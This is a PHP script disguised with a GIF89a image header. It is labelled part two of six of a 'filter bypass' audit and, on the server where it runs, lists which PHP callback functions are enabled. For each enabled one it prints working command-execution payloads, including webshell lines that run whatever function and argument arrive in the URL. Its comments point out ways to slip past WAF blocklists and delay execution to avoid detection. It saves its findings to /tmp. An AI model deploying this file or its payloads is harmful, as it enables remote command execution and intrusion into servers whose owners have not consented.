GIF89a;
<?php
error_reporting(0);
$d = array_map('trim', explode(',', ini_get('disable_functions')));
function ok($f){ global $d; return function_exists($f) && !in_array($f,$d); }
$o = '';

$o .= "============================================================\n";
$o .= "  PART 2/6 - Callback Functions (Filter Bypass)\n";
$o .= "============================================================\n\n";

$o .= "====== 3. Callback Functions [HIGH] ======\n";
$o .= "Can call dangerous functions INDIRECTLY to bypass WAF/filters\n";
$o .= "Even if 'system' is in WAF blocklist, callbacks pass it as string arg\n\n";

$o .= "--- PRIMARY CALLBACKS (Most useful) ---\n\n";
$pri = array(
    'call_user_func' => array(
        "call_user_func('system','id');",
        "call_user_func(\$_GET['f'],\$_GET['a']);  // ?f=system&a=id",
        'Calls ANY function by string name - most direct callback'
    ),
    'call_user_func_array' => array(
        "call_user_func_array('system',['id']);",
        "call_user_func_array(\$_GET['f'],[\$_GET['a']]);",
        'Same but passes args as array'
    ),
    'array_map' => array(
        "array_map('system',['id']);",
        "array_map('system',\$_GET['c']);  // ?c[]=id&c[]=whoami",
        'Applies function to EACH element - runs multiple commands!'
    ),
    'array_filter' => array(
        "array_filter(['id'],'system');",
        "array_filter(\$_GET['c'],'system');",
        'Each element passed as arg to callback'
    ),
    'array_walk' => array(
        "array_walk(['id','whoami'],'system');",
        "",
        'Walks array applying callback to each element'
    ),
    'array_walk_recursive' => array(
        "array_walk_recursive(['id'],'system');",
        "",
        'Recursive version - works with nested arrays'
    ),
    'ob_start' => array(
        "ob_start('system'); echo 'id'; ob_end_flush();",
        "ob_start(\$_GET['f']); echo \$_GET['c']; ob_end_flush();",
        'Output buffer callback - content becomes the command!'
    ),
    'forward_static_call' => array(
        "forward_static_call('system','id');",
        "",
        'Less known - rarely in WAF blocklists!'
    ),
    'forward_static_call_array' => array(
        "forward_static_call_array('system',['id']);",
        "",
        'Array version - also rarely blocked'
    ),
);
foreach ($pri as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[2]}\n";
    if (ok($f)) {
        $o .= "           Quick: {$info[0]}\n";
        if ($info[1]) $o .= "           Shell: {$info[1]}\n";
    }
    $o .= "\n";
}

$o .= "--- SORT CALLBACKS ---\n\n";
$sorts = array(
    'usort'  => "usort(\$a=array(1,2),'system');  // limited control over arg",
    'uasort' => "uasort(\$a=array(1,2),'system');",
    'uksort' => "uksort(\$a=array('id'=>1),'system');",
);
foreach ($sorts as $f => $p) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    if (ok($f)) $o .= "           Payload: $p\n";
    $o .= "\n";
}

$o .= "--- EVENT/LIFECYCLE CALLBACKS ---\n\n";
$events = array(
    'register_shutdown_function' => array(
        "register_shutdown_function('system','id');",
        'Runs at script END - delayed execution, harder to detect'
    ),
    'register_tick_function' => array(
        "declare(ticks=1); register_tick_function('system','id');",
        'Runs every tick - needs declare(ticks=N)'
    ),
    'set_error_handler' => array(
        "set_error_handler('system'); \$x=1/0;  // trigger error = trigger cmd",
        'Error handler - trigger by causing any error'
    ),
    'set_exception_handler' => array(
        "set_exception_handler('system'); throw new Exception('id');",
        'Exception handler callback'
    ),
    'assert_options' => array(
        "assert_options(ASSERT_CALLBACK,'system'); assert(false);",
        'Assert failure callback - trigger by assert(false)'
    ),
    'spl_autoload_register' => array(
        "spl_autoload_register('system'); new id();  // class 'id' triggers autoload",
        'Autoload - instantiating unknown class triggers callback'
    ),
);
foreach ($events as $f => $info) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    $o .= "           {$info[1]}\n";
    if (ok($f)) $o .= "           Payload: {$info[0]}\n";
    $o .= "\n";
}

$o .= "--- REGEX/ITERATOR CALLBACKS ---\n\n";
$regex = array(
    'preg_replace_callback' => "preg_replace_callback('/.*/', 'system', 'id');",
    'iterator_apply'        => "// needs ArrayIterator setup",
);
foreach ($regex as $f => $p) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
    if (ok($f)) $o .= "           Payload: $p\n";
    $o .= "\n";
}

$o .= "--- ARRAY COMPARISON CALLBACKS ---\n";
$o .= "(All take callback as last argument)\n\n";
$arr = array(
    'array_diff_uassoc','array_diff_ukey','array_intersect_uassoc',
    'array_intersect_ukey','array_udiff','array_udiff_assoc',
    'array_udiff_uassoc','array_uintersect','array_uintersect_assoc',
    'array_uintersect_uassoc','array_reduce',
    'session_set_save_handler',
);
foreach ($arr as $f) {
    $s = ok($f) ? "[+] AVAILABLE" : "[-] blocked";
    $o .= "  $s  $f\n";
}

file_put_contents('/tmp/_audit_p2.txt', $o);
header('Content-Type: text/plain; charset=utf-8');
echo $o;
echo "\n[*] Part 2/6 saved to /tmp/_audit_p2.txt\n";
?>
